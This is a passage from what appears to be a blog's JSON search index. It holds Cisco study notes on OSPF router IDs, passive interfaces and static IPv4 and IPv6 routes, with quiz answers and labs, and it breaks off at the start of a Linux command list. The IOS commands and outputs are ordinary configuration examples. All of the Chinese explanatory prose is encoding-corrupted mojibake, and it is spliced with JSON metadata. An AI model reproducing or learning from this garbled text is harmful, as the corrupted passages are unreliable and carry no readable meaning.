åœ°å€ã€‚å¦‚æœªæ›¾é…ç½®ç¯å›æ¥å£ï¼Œè½¯ä»¶å°±ä¼šä½¿ç”¨æ‰€æœ‰é…ç½®çš„ç‰©ç†æ¥å£ä¸­æœ€é«˜çš„ IP åœ°å€ï¼Œæ¥ä½œä¸º 0SPF è·¯ç”±å™¨ ID ã€‚æ€ç§‘ IOS è½¯ä»¶åŒæ ·å…è®¸ç®¡ç†å‘˜ä½¿ç”¨è·¯ç”±å™¨é…ç½®å‘½ä»¤router-id [address], æ¥æ‰‹åŠ¨æŒ‡å®šè·¯ç”±å™¨ ID ã€‚ ç¯å›æ¥å£æä¸ºæœ‰ç”¨ï¼Œç‰¹åˆ«æ˜¯åœ¨æµ‹è¯•å½“ä¸­ï¼Œå› ä¸ºå®ƒä»¬æ— éœ€ç¡¬ä»¶ä¸”æ˜¯é€»è¾‘çš„ï¼Œå› æ­¤ç»ä¸ä¼šå®•æ‰ã€‚ åœ¨ä¸‹é¢çš„è·¯ç”±å™¨ä¸Šï¼Œç»™Loopback0é…ç½®äº† IP åœ°å€1.1.1.1&#x2F;32, ç»™F0&#x2F;0é…ç½®äº†2.2.2.2&#x2F;24ã€‚æ¥ç€åœ¨è·¯ç”±å™¨ä¸Šç»™æ‰€æœ‰æ¥å£é…ç½®äº† OSPF ã€‚ Router(config-if)#router ospf 1Router(config-router)#net 0.0.0.0 255.255.255.255 area 0Router(config-router)#endRouter#%SYS-5-CONFIG_I: Configured from console by consoleRouter#show ip protocolsRouting Protocol is â€œospf 1â€ Outgoing update filter list for all interfaces is not set Incoming update filter list for all interfaces is not set Router ID 1.1.1.1 Number of areas in this router is 1. 1 normal 0 stub 0 nssa Maximum path: 4 Routing for Networks: 0.0.0.0 255.255.255.255 area 0 Routing Information Sources: Gateway Distance Last Update 1.1.1.1 110 00:00:14 Distance: (default is 110)ä½†åˆæƒ³è¦å°†è·¯ç”±å™¨ ID ç¡¬ç¼–ç ï¼ˆhard codeï¼‰ä¸º10.10.10.1ã€‚é‚£ä¹ˆå¯é€šè¿‡å†é…ç½®ä¸€ä¸ªä½¿ç”¨è¯¥ IP åœ°å€çš„ç¯å›æ¥å£ï¼Œæˆ–ç®€å•åœ°å°†è¿™ä¸ª IP åœ°å€åŠ åœ¨ OSPF è·¯ç”±å™¨ ID å¤„ã€‚ä¸ºä»¤åˆ°æ”¹å˜ç”Ÿæ•ˆï¼Œå¿…é¡»é‡å¯è·¯ç”±å™¨æˆ–åœ¨è·¯ç”±å™¨ä¸Šæ¸…é™¤è¯¥IP OSPFè¿›ç¨‹ï¼ˆæ¸…é™¤ç°æœ‰æ•°æ®åº“ï¼‰ã€‚ Router#conf tEnter configuration commands, one per line.End with CNTL&#x2F;Z.Router(config)#router ospf 1Router(config-router)#router-id 10.10.10.1Router(config-router)#Reload or use â€œclear ip ospf processâ€ command, for this to take effectRouter(config-router)#endRouter#%SYS-5-CONFIG_I: Configured from console by consoleRouter#clear ip ospf processReset ALL OSPF processes? [no]: yesRouter#show ip protRouting Protocol is â€œospf 1â€ Outgoing update filter list for all interfaces is not set Incoming update filter list for all interfaces is not set Router ID 10.10.10.1 Number of areas in this router is 1. 1 normal 0 stub 0 nssa Maximum path: 4 Routing for Networks: 0.0.0.0 255.255.255.255 area 0 Routing Information Sources: Gateway Distance Last Update 1.1.1.1 110 00:03:15Distance: (default is 110)åˆ°ç¬¬39å¤©ï¼ŒDRå’Œ BDR é€‰ä¸¾æ—¶ï¼Œå°±å°†çœ‹åˆ°è¿™ä¸ªè·¯ç”±å™¨ ID æœ‰ç€ç‰¹åˆ«çš„é‡è¦æ€§ã€‚ OSPFè¢«åŠ¨æ¥å£OSPF Passive Interfaces è¢«åŠ¨æ¥å£å¯è¢«æè¿°æˆåœ¨å…¶ä¸Šæ²¡æœ‰è·¯ç”±æ›´æ–°å‘å‡ºçš„æ¥å£ã€‚åœ¨æ€ç§‘ IOS è½¯ä»¶ä¸­ï¼Œé€šè¿‡ä½¿ç”¨è·¯ç”±å™¨é…ç½®å‘½ä»¤passive-interface [name], å°†æŸæ¥å£é…ç½®ä¸ºè¢«åŠ¨æ¥å£ã€‚å¦‚è·¯ç”±å™¨ä¸Šæœ‰å¤šä¸ªæ¥å£éœ€è¦é…ç½®ä¸ºè¢«åŠ¨æ¥å£ï¼Œå°±åº”ä½¿ç”¨passive-interface defaultè¿™ä¸ªè·¯ç”±å™¨é…ç½®å‘½ä»¤ã€‚æ­¤å‘½ä»¤å°†è·¯ç”±å™¨ä¸Šé‚£äº›ä½å¤„æ‰€é…ç½®ç½‘ç»œèŒƒå›´å†…çš„æ‰€æœ‰æ¥å£ï¼Œéƒ½é…ç½®ä¸ºè¢«åŠ¨æ¨¡å¼ã€‚è€Œé‚£äº›éœ€è¦å…è®¸åœ¨å…¶ä¸Šå½¢æˆé‚»æ¥å…³ç³»æˆ–é‚»å±…å…³ç³»çš„æ¥å£ï¼Œå°±åº”ä½¿ç”¨è·¯ç”±å™¨é…ç½®å‘½ä»¤no passive-interface [name]å¯¹å…¶è¿›è¡Œé…ç½®ã€‚ è¢«åŠ¨æ¥å£é…ç½®åœ¨ OSPF å’Œ EIGRP ä¸­çš„å·¥ä½œæ–¹å¼æ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿå°±æ˜¯ä¸€æ—¦æŸæ¥å£è¢«æ ‡è®°ä¸ºè¢«åŠ¨æ¥å£ï¼Œç»ç”±è¯¥æ¥å£å½¢æˆçš„æ‰€æœ‰é‚»å±…å…³ç³»éƒ½ä¼šè¢«æ‹†é™¤ï¼ŒåŒæ—¶ å†ä¹Ÿä¸ä¼šé€šè¿‡è¯¥æ¥å£å‘é€æˆ–æ¥æ”¶Helloæ•°æ®åŒ…äº†ã€‚ä¸è¿‡ï¼Œæ ¹æ®è·¯ç”±å™¨ä¸Šæ‰€é…ç½®çš„ç½‘ç»œé…ç½®è¯­å¥ï¼Œè¯¥æ¥å£ä»ç„¶ä¼šç»§ç»­å—é€šå‘Šã€‚ Router(config)#router ospf 10Router(config-router)#passive-interface f0&#x2F;0Router#show ip ospf int f0&#x2F;0FastEthernet0&#x2F;0 is up, line protocol is up Internet address is 192.168.1.1&#x2F;24, Area 0 Process ID 10,Router ID 172.16.1.1,Network Type BROADCAST, Cost: 1 Transmit Delay is 1 sec, State WAITING, Priority 1 No designated router on this network No backup designated router on this network Timer intervals configured,Hello 10, Dead 40, Wait 40,Retransmit 5 No Hellos (Passive interface)ç¬¬ 12 å¤©é—®é¢˜What protocol does OSPF use?How does OSPF determine whether other Link State routers are operating on the interfaces as well?When a _______ routing protocol is enabled for a particular link, information associated with that network is added to the local Link State Database (LSDB).OSPF utilises IP Multicast when sending and receiving updates on Multi-Access networks, such as Ethernet. True or false?OSPF is a hierarchical routing protocol that logically divides the network into subdomains referred to as _______.Name at least 4 OSPF network types.Name the command used to enter OSPF configuration mode.When determining the OSPF router ID, Cisco IOS selects the lowest IP address of the configured Loopback interfaces. True or false?What command can you use to assign an interface to OSPF Area 2 (interface level command)?_______ can be described as interfaces over which no routing updates are sent.##ç¬¬ 12 å¤©ç­”æ¡ˆ IP number 89.By sending Hello packets.Link State.True.Areas.Non-Broadcast, Point-to-Point, Broadcast, Point-to-Multipoint, Point-to-Multipoint Non-Broadcast, and Loopback.The router ospf command.False.The ip ospf area 2Passive.##ç¬¬ 12 å¤©å®éªŒ ###OSPFåŸºç¡€å®éªŒ æ²¿ç”¨ç¬¬10å¤©çš„å®éªŒåœºæ™¯ï¼ˆä¸¤å°ç›´æ¥è¿æ¥çš„è·¯ç”±å™¨ï¼Œå„è‡ªå…¶ä¸Šçš„ç¯å›æ¥å£ï¼‰ï¼Œä½†å–ä»£é…ç½® RIP åŠå¯¹ç‰©ç†å’Œç¯å›æ¥å£è¿›è¡Œé€šå‘Šçš„æ˜¯ï¼Œä½¿ç”¨OSPF 0å·åŒºåŸŸå®ç°ï¼ˆbut instead of configuring RIP and advertising the physical and Loopback interfaces, do this using OSPF Area 0ï¼‰ã€‚ åˆ†é…ä¸€ä¸ª IPv4 åœ°å€ç»™ç›´æ¥è¿æ¥çš„æ¥å£ï¼ˆ10.10.10.1&#x2F;24åŠ10.10.10.2&#x2F;24ï¼‰è¿ç”¨pingæ“ä½œï¼Œæµ‹è¯•ç›´æ¥è¿é€šæ€§åˆ†åˆ«åœ¨ä¸¤å°è·¯ç”±å™¨ä¸Šé…ç½®ä¸€ä¸ªç¯å›æ¥å£ï¼Œå¹¶è‡ªä¸¤ä¸ªä¸åŒèŒƒå›´ä¸ºå…¶åˆ†é…ä¸Šåœ°å€ï¼ˆ11.11.11.1&#x2F;32åŠ12.12.12.2&#x2F;32ï¼‰é…ç½®ä¸Šæ ‡å‡†OSPF 1å·è¿›ç¨‹ï¼Œå¹¶åœ¨0å·åŒºåŸŸä¸­é€šå‘Šæ‰€æœ‰æœ¬åœ°ç½‘ç»œã€‚åŒæ—¶ä¸ºä¸¤å°è®¾å¤‡é…ç½®ä¸€ä¸ªè·¯ç”±å™¨ ID ã€‚R1: router ospf 1router-id 1.1.1.1network 10.10.10.0 0.0.0.255 area 0network 11.11.11.1 0.0.0.0 area 0R2: router ospf 1router-id 2.2.2.2network 10.10.10.0 0.0.0.255 area 0network 12.12.12.2 0.0.0.0 area 0è‡ªR1å‘R2çš„ç¯å›æ¥å£æ‰§è¡Œ ping æ“ä½œï¼Œä»¥æµ‹è¯•è¿é€šæ€§æ‰§è¡Œä¸€æ¡show ip routeå‘½ä»¤ï¼Œæ¥éªŒè¯æœ‰é€šè¿‡ OSPF æ¥æ”¶åˆ°è·¯ç”±æ‰§è¡Œä¸€æ¡show ip protocolså‘½ä»¤ï¼Œæ¥éªŒè¯æœ‰é…ç½® OSPF ä¸”åœ¨è®¾å¤‡ä¸Šæ˜¯æ´»åŠ¨çš„åšæŒç‰¹å®šäº OSPF çš„æ¥å£å‚æ•°ï¼šshow ip ospf interfaceåŠshow ip ospf interface briefåœ¨ä¸¤å°è·¯ç”±å™¨ä¸Šï¼ˆç›´æ¥è¿æ¥æ¥å£ï¼‰ä¿®æ”¹ OSPF çš„ Hello åŒ…å’Œæ­»äº¡è®¡æ—¶å™¨ï¼šip ospf helloåŠip ospf deadæ‰§è¡Œä¸€ä¸‹show ip ospf 1å‘½ä»¤ï¼Œçœ‹çœ‹è·¯ç”±è¿›ç¨‹å‚æ•°é‡å¤è¯¥å®éªŒï¼Œä½†è¿™æ¬¡ä½¿ç”¨ip ospf 1 area 0 interface specificå‘½ä»¤ï¼Œè€Œä¸æ˜¯åœ¨router OSPF ä¸‹çš„networkå‘½ä»¤ï¼Œå¯¹å„ä¸ªç½‘ç»œè¿›è¡Œé€šå‘Šã€‚","categories":[],"tags":[]},{"title":"é™æ€è·¯ç”±","slug":"é™æ€è·¯ç”±","date":"2022-11-13T16:01:03.000Z","updated":"2023-12-02T12:28:05.302Z","comments":true,"path":"2022/11/14/é™æ€è·¯ç”±/","link":"","permalink":"http://example.com/2022/11/14/%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1/","excerpt":"é™æ€è·¯ç”±é…ç½®Configuring Static Routes é…ç½®ä¸€æ¡é™æ€è·¯ç”±ï¼ˆè§ä¸‹å›¾11.1ï¼‰éœ€è¦ä»¥ä¸‹è¿™äº›å‘½ä»¤ã€‚ network address&#x2F;prefix maskaddress or exit interfacedistance (optional)è¿™é‡Œæ˜¯ä¸€ä¸ªè¿™äº›å‘½ä»¤ä½¿ç”¨çš„å®ä¾‹ã€‚ RouterA(config)#ip route network prefix mask {address | interface} [distance]","text":"é™æ€è·¯ç”±é…ç½®Configuring Static Routes é…ç½®ä¸€æ¡é™æ€è·¯ç”±ï¼ˆè§ä¸‹å›¾11.1ï¼‰éœ€è¦ä»¥ä¸‹è¿™äº›å‘½ä»¤ã€‚ network address&#x2F;prefix maskaddress or exit interfacedistance (optional)è¿™é‡Œæ˜¯ä¸€ä¸ªè¿™äº›å‘½ä»¤ä½¿ç”¨çš„å®ä¾‹ã€‚ RouterA(config)#ip route network prefix mask {address | interface} [distance] é™æ€è·¯ç”±ç¤ºä¾‹ç½‘ç»œ å›¾11.1 â€“ é™æ€è·¯ç”±ç¤ºä¾‹ç½‘ç»œ è¦åŠ å…¥ä¸Šé¢ç½‘ç»œçš„ä¸€æ¡é™æ€è·¯ç”±ï¼Œå°±è¦åœ¨å·¦è¾¹çš„è·¯ç”±å™¨ä¸Šå†™å‡ºä¸‹é¢è¿™è¡Œé…ç½®ã€‚ Router(config)#ip route 192.168.1.0 255.255.255.0 172.16.1.2å¯¹é™æ€è·¯ç”±ï¼Œéœ€è¦æŒ‡å®šåœ¨å‰å¾€ç›®çš„åœ°å€çš„è·¯é€”ä¸Šï¼Œè·¯ç”±å™¨éœ€è¦å»å¾€çš„ä¸‹ä¸€è·³ IP åœ°å€ï¼Œæˆ–è€…ä¹Ÿå¯ä»¥æŒ‡å®šä¸€ä¸ªå‡ºå»çš„æ¥å£ã€‚é€šå¸¸ä¸éœ€è¦çŸ¥é“ä¸‹ä¸€è·³åœ°å€ï¼Œå› ä¸ºé‚£å°±æ˜¯ ISP ï¼Œæˆ–è€… IP åœ°å€ä¼šéšæ—¶å˜åŒ–ï¼ˆè§ä¸‹å›¾11.2ï¼‰ã€‚å¦‚æœæ˜¯è¿™æ ·ï¼Œå°±è¦ä½¿ç”¨å‡ºå»çš„æ¥å£ã€‚ ä¸æ€»æ˜¯çŸ¥é“ä¸‹ä¸€è·³åœ°å€çš„æƒ…å½¢ å›¾11.2 â€“ ä¸æ€»æ˜¯çŸ¥é“ä¸‹ä¸€è·³åœ°å€çš„æƒ…å½¢ Router(config)#ip route 192.168.1.0 255.255.255.0 s0&#x2F;0ä¸Šé¢çš„å‘½ä»¤è¡Œå‘Šè¯‰è·¯ç”±å™¨å°†ç›®çš„ä¸º192.168.1.10ç½‘ç»œçš„æµé‡ï¼Œä»ä¸²è¡Œæ¥å£å‘å‡ºã€‚è€Œä¸‹é¢çš„å‘½ä»¤åˆ™æ˜¯å‘Šè¯‰è·¯ç”±å™¨å°†æ‰€æœ‰ç½‘ç»œçš„æ‰€æœ‰æµé‡ï¼Œéƒ½ä»ä¸²è¡Œæ¥å£å‘å‡ºã€‚ Router(config)#ip route 0.0.0.0 0.0.0.0 s0&#x2F;0ä¸Šé¢çš„è·¯ç”±å®é™…ä¸Šå°±æ˜¯ä¸€æ¡é»˜è®¤è·¯ç”±ï¼ˆa default routeï¼‰ã€‚é»˜è®¤è·¯ç”±ç”¨äºå¼•å¯¼é‚£äº›æœªåœ¨è·¯ç”±è¡¨ä¸­æ˜¾å¼åˆ—å‡ºçš„ç›®çš„ç½‘ç»œçš„æ•°æ®åŒ…ã€‚ é™æ€ IPv6 è·¯ç”±çš„é…ç½®Configuring Static IPv6 Routes é™æ€ IPv6 è·¯ç”±çš„é…ç½®ï¼Œä¸é™æ€ IPv4 è·¯ç”±çš„é…ç½®éµå¾ªåŒæ ·çš„é€»è¾‘ã€‚åœ¨æ€ç§‘ IOS è½¯ä»¶ä¸­ï¼Œå…¨å±€é…ç½®å‘½ä»¤ipv6 route [ipv6-prefix&#x2F;prefix-length] [next-hop-address | interface] [distance &lt;1-254&gt; | multicast | tag | unicast]ç”¨äºé…ç½®é™æ€ IPv6 è·¯ç”±ã€‚å½“ä¸­çš„ä¸€äº›å…³é”®å­—æ˜¯ç†Ÿæ‚‰çš„ï¼Œå› ä¸ºå®ƒä»¬ä¹Ÿé€‚ç”¨äº IPv4 é™æ€è·¯ç”±ï¼Œè€Œ[multicast]å…³é”®å­—åˆ™æ˜¯ IPv6 æ‰€ç‹¬æœ‰çš„ï¼Œç”¨äºé…ç½®ä¸€æ¡ IPv6 é™æ€å¤šæ’­è·¯ç”±(an IPv6 static Multicast route)ã€‚å¦‚ç”¨åˆ°æ­¤å…³é”®å­—ï¼Œè¯¥è·¯ç”±å°±ä¸ä¼šè¿›åˆ°å•è–„è·¯ç”±è¡¨ï¼ˆthe Unicast routing tableï¼‰ï¼ŒåŒæ—¶ä¹Ÿç»ä¸ä¼šç”¨äºè½¬å‘å•æ’­æµé‡ã€‚ä¸ºç¡®ä¿è¯¥è·¯ç”±ç»ä¸ä¼šå®‰è£…åˆ°å•æ’­è·¯ç”±ä¿¡æ¯åº“ï¼ˆthe Unicast RIBï¼‰, æ€ç§‘ IOS è½¯ä»¶å°†è¯¥æ¡è·¯ç”±ï¼ˆé™æ€å¤šæ’­è·¯ç”±ï¼‰çš„ç®¡ç†è·ç¦»è®¾ç½®ä¸º255ã€‚ ç›¸åï¼Œ[unicast]å…³é”®å­—åˆ™æ˜¯ç”¨äºé…ç½®ä¸€æ¡ IPv6 é™æ€å•æ’­è·¯ç”±ã€‚å¦‚ç”¨åˆ°æ­¤å…³é”®å­—ï¼Œè¯¥æ¡è·¯ç”±å°±ç»ä¸ä¼šè¿›å…¥åˆ°å¤šæ’­è·¯ç”±è¡¨ï¼ˆthe Multicast routing tableï¼‰, å¹¶ä»…è¢«ç”¨äºè½¬å‘å•æ’­æµé‡ã€‚è€Œæ—¢æ²¡ç”¨åˆ°[multicast]å…³é”®å­—ï¼Œä¹Ÿæ²¡ç”¨åˆ°[unicast]å…³é”®å­—æ—¶ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œè¯¥æ¡è·¯ç”±æœºä¼šç”¨äºå•æ’­æ•°æ®åŒ…çš„è½¬å‘ï¼Œä¹Ÿä¼šç”¨äºå¤šæ’­æ•°æ®åŒ…çš„è½¬å‘ã€‚ ä»¥ä¸‹çš„é…ç½®ç¤ºä¾‹ï¼Œæ¼”ç¤ºäº†å¦‚ä½•æ¥é…ç½®3æ¡é™æ€ IPv6 è·¯ç”±ã€‚ç¬¬ä¸€æ¡è·¯ç”±ï¼Œåˆ°å­ç½‘3FFF:1234:ABCD:0001::&#x2F;64, ä¼šå°†æµé‡ä»FastEthernet0&#x2F;0è½¬å‘å‡ºå»ã€‚æ­¤è·¯ç”±ä»…ç”¨äºå•æ’­æµé‡çš„è½¬å‘ã€‚ç¬¬äºŒæ¡è·¯ç”±ï¼Œåˆ°å­ç½‘3FFF:1234:ABCD:0002::&#x2F;64, ä¼šå°†åˆ°é‚£ä¸ªå­ç½‘çš„æ•°æ®åŒ…ä»Serial0&#x2F;0ï¼Œä½¿ç”¨ä¸‹ä¸€è·³è·¯ç”±å™¨çš„æ•°æ®é“¾è·¯å±‚åœ°å€ï¼Œä½œä¸º IPv6 çš„ä¸‹ä¸€è·³åœ°å€è½¬å‘å‡ºå»ã€‚æœ¬æ¡è·¯ç”±ä»…ä¼šç”¨äºå¤šæ’­æµé‡ã€‚æœ€åï¼ŒåŒæ ·é…ç½®äº†ä¸€æ¡æŒ‡å‘Serial0&#x2F;1ä½œä¸ºå‡ºå£æ¥å£çš„é»˜è®¤è·¯ç”±ã€‚æ­¤é»˜è®¤è·¯ç”±å°†ä¼šé€šè¿‡Serial0&#x2F;1, ä½¿ç”¨ä¸‹ä¸€è·³è·¯ç”±å™¨çš„æœ¬åœ°é“¾è·¯åœ°å€ä½œä¸º IPv6 ä¸‹ä¸€è·³åœ°å€ï¼Œè½¬å‘é‚£äº›åˆ°æœªçŸ¥ IPv6 ç›®çš„åœ°å€çš„æ•°æ®åŒ…ã€‚è¿™äº›è·¯ç”±å¦‚ä¸‹é¢æ‰€ç¤ºã€‚ R1(config)#ipv6 route 3FFF:1234:ABCD:0001::&#x2F;64 Fa0&#x2F;0 unicastR1(config)#ipv6 route 3FFF:1234:ABCD:0002::&#x2F;64 Se0&#x2F;0 FE80::2222 multicastR1(config)#ipv6 route ::&#x2F;0 Serial0&#x2F;1 FE80::3333ä¾æ­¤é…ç½®ï¼Œå‘½ä»¤show ipv6 routeå¯ç”¨äºéªŒè¯åœ¨æœ¬åœ°è·¯ç”±å™¨ä¸Šåº”ç”¨çš„é™æ€è·¯ç”±é…ç½®ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ R1#show ipv6 route staticIPv6 Routing Table - 13 entriesCodes: C - Connected, L - Local, S - Static, R - RIP, B - BGP U - Per-user static route I1 - ISIS L1, I2 - ISIS L2, IA - ISIS inter area, IS - ISIS summary O - OSPF intra, OI - OSPF inter, OE1 - OSPF ext 1, OE2 - OSPF ext 2 ON1 - OSPF NSSA ext 1, ON2 - OSPF NSSA ext 2S ::&#x2F;0 [1&#x2F;0] via FE80::3333, Serial0&#x2F;1S 3FFF:1234:ABCD:1::&#x2F;64 [1&#x2F;0] via ::, FastEthernet0&#x2F;0S 3FFF:1234:ABCD:2::&#x2F;64 [1&#x2F;0] via FE80::2222, Serial0&#x2F;0é™¤äº†ä½¿ç”¨show ipv6 routeå‘½ä»¤å¤–ï¼Œå‘½ä»¤show ipv6 static [prefix] [detail]ä¹Ÿå¯ä¸€ç”¨æ¥å¯¹æ‰€æœ‰æˆ–ä»…æ˜¯æŸæ¡ç‰¹å®šé™æ€è·¯ç”±çš„ç»†èŠ‚ä¿¡æ¯è¿›è¡ŒæŸ¥çœ‹ã€‚ä¸‹é¢è¾“å‡ºæ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨è¿™ä¸ªå‘½ä»¤ã€‚ R1#show ipv6 static 3FFF:1234:ABCD:1::&#x2F;64 detailIPv6 static routesCode: * - installed in RIB 3FFF:1234:ABCD:1::&#x2F;64 via interface FastEthernet0&#x2F;0, distance 1é™æ€è·¯ç”±æ’é”™Troubleshooting Satic Routes æ’é”™æ€»ä¼šæ¶‰åŠåˆ°æŸä¸ªé…ç½®é—®é¢˜ï¼ˆå¦‚æœä¸æ˜¯æ¥å£å®•æ‰çš„è¯ï¼‰ã€‚å¦‚æµé‡æ²¡æœ‰åˆ°è¾¾ç›®çš„åœ°ï¼Œå°±å¯ä»¥ä½¿ç”¨å‘½ä»¤tracerouteæµ‹è¯•è¯¥è·¯ç”±ã€‚ æ³¨æ„ â€“ ä»Šå¤©å†…å®¹å¾ˆå°‘ï¼Œæ‰€ä»¥è¯·å‰å¾€ç¬¬ 12 å¤©å§ï¼Œå› ä¸ºé‚£å°†æ˜¯ä¸ªéå¸¸å……å®çš„ä¸»é¢˜ã€‚ ç¬¬ 11 å¤©é—®é¢˜Name the three parameters needed to configure a static route.What is the command used to configure a static route?What is the command used to configure a default static route?What is the command used to configure an IPv6 static route?What is the command used to view IPv6 static routes?ç¬¬ 11 å¤©ç­”æ¡ˆNetwork address, subnet mask (prefix length), and next-hop address or exit interface.The ip route command.The ip route 0.0.0.0 0.0.0.0 command.The ipv6 route command.The show ipv6 route static command.ç¬¬ 11 å¤©å®éªŒé™æ€è·¯ç”±å®éªŒStatic Routes Lab æ‹“æ‰‘å›¾ é™æ€è·¯ç”±å®éªŒæ‹“æ‰‘å›¾ å®éªŒç›®çš„ å­¦ä¹ å¦‚ä½•ä»¥ä¸‹ä¸€è·³åœ°å€å’Œå‡ºå£æ¥å£æ–¹å¼ï¼Œå°†é™æ€è·¯ç”±æŒ‡å®šç»™ä¸€å°è·¯ç”±å™¨ã€‚ å®éªŒæ­¥éª¤ æŒ‰ç…§ä¸Šé¢çš„æ‹“æ‰‘å›¾åˆ†é… IP åœ°å€ã€‚Router Aå¯ä»¥æ˜¯192.168.1.1&#x2F;30, Router Bå¯ä»¥æ˜¯.2ã€‚ é€šè¿‡ä¸²è¡Œé“¾è·¯è¿›è¡Œpingæ“ä½œï¼Œä»¥ç¡®ä¿è¯¥é“¾è·¯æ˜¯å·¥ä½œçš„ã€‚ åœ¨Router Aä¸ŠæŒ‡å®šä¸€æ¡é™æ€è·¯ç”±ï¼Œå°†åˆ°10.1.1.0&#x2F;10ç½‘ç»œçš„æ‰€æœ‰æµé‡ï¼Œä»ä¸²è¡Œæ¥å£å‘é€å‡ºå»ã€‚å½“ç„¶è¦ä½¿ç”¨ä½ è‡ªå·±çš„ä¸²è¡Œç«¯å£ç¼–å·ï¼›ä¸è¦åªæ˜¯æ‹·è´æˆ‘çš„é…ç½®ï¼Œä½ çš„æ¥å£æœ‰ä¸åŒç¼–å·ï¼ RouterA(config)#ip route 10.0.0.0 255.192.0.0 Serial0&#x2F;1&#x2F;0RouterA(config)#exitRouterA#ping 10.1.1.1Type escape sequence to abort.Sending 5, 100-byte ICMP Echos to 10.1.1.1, timeout is 2 seconds:!!!!!Success rate is 100 percent (5&#x2F;5), round-trip min&#x2F;avg&#x2F;max &#x3D; 18&#x2F;28&#x2F;32 msRouterA#RouterA#show ip routeCodes: C - Connected, S - Static, I - IGRP, R - RIP, M - Mobile, B - BGP D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2 E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area * - Candidate default, U - Per-user static route, o - ODR P - Periodic downloaded static routeGateway of last resort is not set 10.0.0.0&#x2F;10 is subnetted, 1 subnetsS 10.0.0.0 is directly connected, Serial0&#x2F;1&#x2F;0 172.16.0.0&#x2F;24 is subnetted, 1 subnetsC 172.16.1.0 is directly connected, Loopback0 192.168.1.0&#x2F;30 is subnetted, 1 subnetsC 192.168.1.0 is directly connected, Serial0&#x2F;1&#x2F;0RouterA#RouterA#show ip route 10.1.1.1Routing entry for 10.0.0.0&#x2F;10Known via â€œ static â€, distance 1, metric 0 (connected) Routing Descriptor Blocks: directly connected, via Serial0&#x2F;1&#x2F;0Route metric is 0, traffic share count is 1 RouterA#åœ¨Router Bä¸Šé…ç½®ä¸€æ¡é™æ€è·¯ç”±ï¼Œå°†åˆ°172.16.1.0&#x2F;24ç½‘ç»œçš„æ‰€æœ‰æµé‡ï¼Œå‘åˆ°ä¸‹ä¸€è·³åœ°å€192.168.1.1ã€‚ RouterB(config)#ip route 172.16.1.0 255.255.255.0 192.168.1.1RouterB(config)#exitRouterB#ping 172.16.1.1Type escape sequence to abort.Sending 5, 100-byte ICMP Echos to 172.16.1.1, timeout is 2 seconds:!!!!!RouterB#show ip route 172.16.1.1Routing entry for 172.16.1.0&#x2F;24Known via â€œ static â€, distance 1, metric 0 Routing Descriptor Blocks: 192.168.1.1 Route metric is 0, traffic share count is 1RouterB#","categories":[],"tags":[]},{"title":"linuxè¿ç»´å¸¸ç”¨å‘½ä»¤","slug":"linuxè¿ç»´å¸¸ç”¨å‘½ä»¤","date":"2022-11-10T16:01:03.000Z","updated":"2023-12-02T12:27:44.269Z","comments":true,"path":"2022/11/11/linuxè¿ç»´å¸¸ç”¨å‘½ä»¤/","link":"","permalink":"http://example.com/2022/11/11/linux%E8%BF%90%E7%BB%B4%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/","excerpt":"1ã€æ–‡ä»¶ã€ç›®å½•æ“ä½œå‘½ä»¤ï¼ˆ18ä¸ªï¼‰ls å³listï¼šåˆ—å‡ºç›®å½•çš„å†…å®¹åŠå…¶å†…å®¹å±æ€§ä¿¡æ¯ã€‚ä¸»è¦å‚æ•°ï¼š-aï¼šæ˜¾ç¤ºéšè—æ–‡ä»¶ -lï¼šæ˜¯ä»¥æ›´è¯¦ç»†çš„åˆ—è¡¨å½¢å¼æ˜¾ç¤º-Sï¼š drwxr-xr-x (ä¹Ÿå¯ä»¥ç”¨äºŒè¿›åˆ¶è¡¨ç¤º 111 101 101 â€“&gt; 755)","text":"1ã€æ–‡ä»¶ã€ç›®å½•æ“ä½œå‘½ä»¤ï¼ˆ18ä¸ªï¼‰ls å³listï¼šåˆ—å‡ºç›®å½•çš„å†…å®¹åŠå…¶å†…å®¹å±æ€§ä¿¡æ¯ã€‚ä¸»è¦å‚æ•°ï¼š-aï¼šæ˜¾ç¤ºéšè—æ–‡ä»¶ -lï¼šæ˜¯ä»¥æ›´è¯¦ç»†çš„åˆ—è¡¨å½¢å¼æ˜¾ç¤º-Sï¼š drwxr-xr-x (ä¹Ÿå¯ä»¥ç”¨äºŒè¿›åˆ¶è¡¨ç¤º 111 101 101 â€“&gt; 755) dï¼šæ ‡è¯†èŠ‚ç‚¹ç±»å‹(dï¼šæ–‡ä»¶å¤¹ -ï¼šæ–‡ä»¶ l:é“¾æ¥) rï¼šå¯è¯» wï¼šå¯å†™ xï¼šå¯æ‰§è¡Œ ç¬¬ä¸€ç»„rwxï¼š ## è¡¨ç¤ºè¿™ä¸ªæ–‡ä»¶çš„æ‹¥æœ‰è€…å¯¹å®ƒçš„æƒé™ï¼šå¯è¯»å¯å†™å¯æ‰§è¡Œ ç¬¬äºŒç»„r-xï¼š ## è¡¨ç¤ºè¿™ä¸ªæ–‡ä»¶çš„æ‰€å±ç»„ç”¨æˆ·å¯¹å®ƒçš„æƒé™ï¼šå¯è¯»ï¼Œä¸å¯å†™ï¼Œå¯æ‰§è¡Œ ç¬¬ä¸‰ç»„r-xï¼š ## è¡¨ç¤ºè¿™ä¸ªæ–‡ä»¶çš„å…¶ä»–ç”¨æˆ·(ç›¸å¯¹äºä¸Šé¢ä¸¤ç±»ç”¨æˆ·)å¯¹å®ƒçš„æƒé™ï¼šå¯è¯»ï¼Œä¸å¯å†™ï¼Œå¯æ‰§è¡Œ1234567891011ä»¥ä¸‹å‘½ä»¤å‚æ•°åªæˆªå–éƒ¨åˆ†ï¼Œä¸å…¨ï¼› eg1ï¼š ls -F æŸ¥çœ‹ç›®å½•ä¸­çš„æ–‡ä»¶ ls *[0-9]* æ˜¾ç¤ºåŒ…å«æ•°å­—çš„æ–‡ä»¶åå’Œç›®å½•å ls &#x2F;tmp | pr -T5 -W$COLUMNS å°†ç»ˆç«¯åˆ’åˆ†æˆ5æ æ˜¾ç¤º12345cd å³change 